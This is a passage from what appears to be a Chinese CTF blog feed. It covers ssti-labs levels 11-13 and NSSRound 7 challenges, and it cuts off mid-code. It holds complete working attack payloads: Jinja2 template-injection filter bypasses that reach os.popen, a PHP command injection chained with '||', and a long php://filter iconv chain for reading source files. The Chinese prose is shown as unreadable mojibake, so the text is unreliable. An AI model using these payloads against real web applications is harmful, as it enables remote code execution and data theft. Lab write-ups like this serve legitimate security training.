Á¶ÅÁî®HTMLËΩ¨‰πâÔºåÂ¶ÇÊûúÂºÄÂêØ‰∫ÜÂÖ®Â±ÄËΩ¨‰πâÔºåÈÇ£‰πàsafeËøáÊª§Âô®‰ºöÂ∞ÜÂèòÈáèÂÖ≥ÊéâËΩ¨‰πâ„ÄÇÁ§∫‰æãÔºö &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;Ôºõ</span><br><span class="line"></span><br><span class="line">list()ÔºöÂ∞ÜÂèòÈáèÂàóÊàêÂàóË°®Ôºõ</span><br><span class="line"></span><br><span class="line">string()ÔºöÂ∞ÜÂèòÈáèËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Ôºõ</span><br><span class="line"></span><br><span class="line">join()ÔºöÂ∞Ü‰∏Ä‰∏™Â∫èÂàó‰∏≠ÁöÑÂèÇÊï∞ÂÄºÊãºÊé•ÊàêÂ≠óÁ¨¶‰∏≤„ÄÇÁ§∫‰æãÁúã‰∏äÈù¢payloadÔºõ</span><br><span class="line"></span><br><span class="line">abs()ÔºöËøîÂõû‰∏Ä‰∏™Êï∞ÂÄºÁöÑÁªùÂØπÂÄºÔºõ</span><br><span class="line"></span><br><span class="line">first()ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºõ</span><br><span class="line"></span><br><span class="line">last()ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†Ôºõ</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)ÔºöÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤„ÄÇÊØîÂ¶ÇÔºö&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;Â∞ÜËæìÂá∫ÔºöHelloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÊàñËÄÖÂ≠óÂÖ∏ÁöÑÈïøÂ∫¶Ôºõ</span><br><span class="line"></span><br><span class="line">sum()ÔºöËøîÂõûÂàóË°®ÂÜÖÊï∞ÂÄºÁöÑÂíåÔºõ</span><br><span class="line"></span><br><span class="line">sort()ÔºöËøîÂõûÊéíÂ∫èÂêéÁöÑÂàóË°®Ôºõ</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)ÔºöÂ¶ÇÊûúÂΩìÂâçÂèòÈáèÊ≤°ÊúâÂÄºÔºåÂàô‰ºö‰ΩøÁî®ÂèÇÊï∞‰∏≠ÁöÑÂÄºÊù•‰ª£Êõø„ÄÇÁ§∫‰æãÔºöname|default(&#x27;xiaotuo&#x27;)----Â¶ÇÊûúname‰∏çÂ≠òÂú®ÔºåÂàô‰ºö‰ΩøÁî®xiaotuoÊù•Êõø‰ª£„ÄÇboolean=FalseÈªòËÆ§ÊòØÂú®Âè™ÊúâËøô‰∏™ÂèòÈáè‰∏∫undefinedÁöÑÊó∂ÂÄôÊâç‰ºö‰ΩøÁî®default‰∏≠ÁöÑÂÄºÔºåÂ¶ÇÊûúÊÉ≥‰ΩøÁî®pythonÁöÑÂΩ¢ÂºèÂà§Êñ≠ÊòØÂê¶‰∏∫falseÔºåÂàôÂèØ‰ª•‰º†ÈÄíboolean=true„ÄÇ‰πüÂèØ‰ª•‰ΩøÁî®orÊù•ÊõøÊç¢„ÄÇ</span><br><span class="line"></span><br><span class="line">length()ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶ÔºåÂà´ÂêçÊòØcount</span><br></pre></td></tr></table></figure><p>ÂÖàÁ°ÆÂÆö‰∏Ä‰∏™Âà©Áî®ÁöÑpayload<br><code>&#123;&#123;lipsum.__globals__.get('os').popen('type flag').read()&#125;&#125;</code><br>ÁÑ∂ÂêéÂ∞±ÊòØÈÄöËøásetËÆæÁΩÆÂèòÈáèÊê≠ÈÖçjoinËøõË°åÊõøÊç¢ÁªïËøá<br>ÈÄöËøá<code>&#123;&#123;lipsum|string|list&#125;`Ëé∑Âæó‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂàóË°®ÔºåÁÑ∂ÂêéÈÄöËøápopÂáΩÊï∞ÂèØ‰ª•ÂèñÂá∫‰ΩøÁî®<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello [&#x27;&lt;&#x27;, &#x27;f&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27; &#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;_&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;m&#x27;, &#x27;_&#x27;, &#x27;i&#x27;, &#x27;p&#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;8&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;A&#x27;, &#x27;3&#x27;, &#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;, &#x27;4&#x27;, &#x27;0&#x27;, &#x27;&gt;&#x27;]</span><br></pre></td></tr></table></figure>‰ΩøÁî®`|attr`Â∞Ü`.`ÊõøÊç¢ÔºåÂæóÂà∞`&#123;&#123;lipsum|attr("__globals__")|attr("get")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>ÁÑ∂ÂêéÊûÑÈÄ†Â≠óÁ¨¶ÁªïËøáÂºïÂè∑ÈôêÂà∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1) | join %&#125;</span><br><span class="line">&#123;% set o=dict(os=1) | join %&#125;</span><br><span class="line">&#123;% set p=dict(popen=1) |join %&#125;</span><br><span class="line">&#123;% set r=dict(read=1) | join %&#125;</span><br></pre></td></tr></table></figure><p>Ê≠§Êó∂payload‰∏∫<br><code>&#123;&#123;lipsum|attr("__globals__")|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ÁÑ∂ÂêéÂÜçÊûÑÈÄ†<code>&quot;__globals__&quot;</code><br>ÂÖàÁúã‰∏ãÂàíÁ∫øÊûÑÈÄ†ÊñπÊ≥ï</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞Ü‰∏ãÂàíÁ∫øÂíåglobalsÊãºÊé•ËµãÂÄºÁªôglobalÂΩ¢Êàê<code>&quot;__globals__&quot;</code><br><code>&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</code><br>Ê≠§Êó∂payload‰∏∫<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>ÁÑ∂ÂêéÂÜçÊûÑÈÄ†<code>&quot;type flag&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br></pre></td></tr></table></figure><p>‰∏≠Èó¥Êúâ‰∏™Á©∫Ê†ºÔºåÊûÑÈÄ†‰∏™Á©∫Ê†º<br><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</code><br>ÁÑ∂ÂêéÊãºÊé•ËµãÂÄºÁªô‰∏Ä‰∏™Êñ∞ÂèòÈáè<br><code>&#123;% set cmd=(t,space,f)|join%&#125;</code><br>Âà∞ËøôÈáåÊûÑÈÄ†ÂÆåÊàêÔºåÊ≠§Êó∂ÁöÑpayload‰∏∫<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</code><br>ÁÑ∂ÂêéÁªºÂêàËµ∑Êù•ÂæóÂà∞ÊúÄÁªàflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058439.png" alt="image-20230328105827313"></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫Ü‰∏ãÂàíÁ∫ø<code>_</code>,ÁÇπ<code>.</code>,Êï∞Â≠ó<code>0-9</code>,ÂèçÊñúÊù†<code>\</code>,ÂçïÂºïÂè∑<code>&#39;</code>,ÂèåÂºïÂè∑<code>&quot;</code>,ÊñπÊã¨Âè∑<code>[]</code><br>Â∞±Êãø‰∏äÈ¢òÁöÑpayloadÔºåÂè™‰∏çËøáÈúÄË¶ÅÂä†‰∏ä9Âíå18ÁöÑÊûÑÈÄ†ÔºåÂõ†‰∏∫Ëøô‰∏§‰∏™Êï∞Â≠óË¢´ËøáÊª§Êó†Ê≥ïÁõ¥Êé•‰ΩøÁî®‰∏ãÊ†á<br>Â≠óÁ¨¶‰∏≤ÂàóË°®Ëé∑ÂèñÂíå‰∏ä‰∏ÄÂÖ≥‰∏ÄÊ†∑ÔºåËøôÈáåÂ∞±‰∏çÂÜçÂºÑ‰∫Ü<br>ÊÄùË∑ØÂ∞±ÊòØÂà©Áî®ÂáΩÊï∞indexÊù•Ëé∑ÂèñÁ¥¢Âºï‰ΩçÁΩÆÁöÑÊï∞Â≠óÔºåÁÑ∂ÂêéÂà©Áî®Êï∞Â≠óÁõ∏‰πòÂæóÂà∞9Âíå18ÔºåËøôÈáå‰∏ãÂàíÁ∫øË¢´ËøáÊª§‰∫ÜÔºå‰∏çÁÑ∂ÂèØ‰ª•Áõ¥Êé•ÂæóÂà∞18<br>ÂÖàÊûÑÈÄ†indexÂáΩÊï∞<br><code>&#123;% set index=dict(index=a)|join %&#125;</code><br>ÁÑ∂ÂêéËé∑Âèñ2Âíå3ÔºåÈÄöËøá<code>2*3*3</code>Âíå<code>3*3</code>ÂæóÂà∞9Âíå18</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u=dict(u=a)|join %&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join %&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n) %&#125;</span><br></pre></td></tr></table></figure><p>Âä†‰∏ä11ÂÖ≥ÁöÑpayloadÔºåÂ∞ÜÊï∞Â≠óÊõøÊç¢Âç≥ÂèØ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set index=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set u=dict(u=a)|join%&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u)%&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n)%&#125;</span><br><span class="line">&#123;% set g=dict(get=a)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=a)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(two*three*three)%&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=a)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=a)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=a)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(three*three)%&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058125.png" alt="image-20230328105842324"></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫Ü<code>_</code>,ÁÇπ<code>.</code>,ÂèçÊñúÊù†<code>\</code>,ÂçïÂºïÂè∑<code>&#39;</code>,ÂèåÂºïÂè∑<code>&quot;</code>,ÊñπÊã¨Âè∑<code>[]</code>,Âä†Âè∑<code>+</code>,‰ª•Âèä‰∏Ä‰∫õÂÖ≥ÈîÆÂ≠ó<br><code>&#39;class&#39;</code>, <code>&#39;init&#39;</code>, <code>&#39;arg&#39;</code>, <code>&#39;config&#39;</code>, <code>&#39;app&#39;</code>, <code>&#39;self&#39;</code><br>‰ΩÜÊòØ11ÂÖ≥ÁöÑpayloadÂàöÂàöÂ•ΩÈÅøÂºÄ‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•Áî®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058257.png" alt="image-20230328105854397"></p><p>ÂèÇËÄÉÔºö<br><a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/#toc-head-12">SSTI-LabsÈù∂Âú∫ - o2takuXX „ÅÆ blogo2takuXX „ÅÆ blog</a><br><a href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LABÊîªÁï• ‚Äì JohnFrod‚Äôs Blog</a><br><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTIÊ®°ÊùøÊ≥®ÂÖ•ÁªïËøáÔºàËøõÈò∂ÁØáÔºâ_sstiÁªïËøá_yu22xÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTIËøõÈò∂ | Ê≤âÈìùÊ±§ÁöÑÁ†¥Á´ô (chenlvtang.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 7 TeamÂ§çÁé∞</title>
      <link href="/2023/02/NSSRound-7-Team%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/NSSRound-7-Team%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ec-RCE"><a href="#ec-RCE" class="headerlink" title="ec_RCE"></a>ec_RCE</h1><p>‰∏Ä‰∏™ÊØîËæÉÁÆÄÂçïÁöÑÈ¢òÔºå‰ΩÜÊòØÈúÄË¶ÅÁúãÊáÇ‰ª£Á†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By Êé¢Âß¨ --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>‰∏ÄÂºÄÂßãËøò‰ª•‰∏∫ÊòØ‰∏™ÊØîËæÉÂ§çÊùÇÁöÑjavaÈ¢òÔºå‰∏ÄË°Ä‰πüÊ≤°Êúâ‰∫ÜÂ∞±Áõ¥Êé•Ë∑≥‰∫ÜÔºå‰∏ãÈù¢ÁöÑshell_execÂêéÈù¢ÊòØÊâßË°åjarÊñá‰ª∂ÔºåactionÂíådataÂèØÊéßÁõ¥Êé•Âà©Áî®<code>||</code>ÊãºÊé•‰∏ÄÊù°catÂëΩ‰ª§Âç≥ÂèØ</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262153808.png" alt="image-20230226215332433"></p><h1 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h1><p>Áõ¥Êé•F12ÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™getÂèÇÊï∞ÔºåÂΩìÁÑ∂ÊäìÂåÖ‰πüË°å</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156758.png" alt="image-20230226215602606"></p><p>ÁÑ∂Âêé‰º†ÂèÇÂèëÁé∞‰∏ãÈù¢Ê∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;get:S0uRc3&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;Round7/&#x27;</span>);  </span><br><span class="line"><span class="comment">// include: Nss  </span></span><br><span class="line"><span class="comment">// include: level2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>])) &#123;    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>],<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Round7&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Xy1on&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">        <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Nothing!!!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;S0uRc3&#x27;</span>]))&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;CTF&#x27;</span>,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nothing here&quot;</span>;  </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂú®0ÁöÑ‰ΩçÁΩÆ‰∏äÈúÄË¶ÅÂåπÈÖçÂà∞Xy1onÔºåÂà©Áî®Â∑•ÂÖ∑Âà∂‰ΩúfilterÈìæÁªïËøáÔºå<a href="https://github.com/synacktiv/php_filter_chain_generator">Â∑•ÂÖ∑Âú∞ÂùÄ</a>ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÂú®Linux‰∏ãËøêË°åÂπ∂‰∏îXy1onÂêéÈù¢Ë¶ÅÊúâ‰∏™Á©∫Ê†ºÔºåÂê¶Âàô‰ºöÂá∫Áé∞‰π±Á†ÅÔºåÂú®Windows‰∏ãÂä†Á©∫Ê†ºÂ∞±‰ºöÊä•ÈîôÔºåËÆøÈóÆlevel2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=level2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156261.png" alt="image-20230226215633307"></p><p>ËøõÂÖ•Ns_SCtF.phpÊãøÂà∞Ê∫êÁ†ÅÔºåËøôÈáåÂÖ∂ÂÆû‰∏ÄÂºÄÂßãÊâ´ÁõÆÂΩïÁöÑËØù‰ºöÊâ´Âà∞‰∏Ä‰∏™DS_StoreÔºåËøõÂéª‰ºöÂèëÁé∞ËÉΩÁõ¥Êé•ÁúãÂà∞Ns_SCtF.phpÂè™ÊòØÈúÄË¶ÅÂà†ÊéâÁ©∫Ê†ºÔºåËøôÊ†∑Â∞±ÁúÅÁï•‰∫Ü‰∏äÈù¢ÁöÑÊ≠•È™§ÔºåÁõ¥Êé•Êù•Âà∞ÊúÄÂêé‰∏ÄÊ≠•ÁªïËøá</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157980.png" alt="image-20230226215717918"></p><p>ÁÑ∂ÂêéÂÜçÁúãÊ∫êÁ†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span 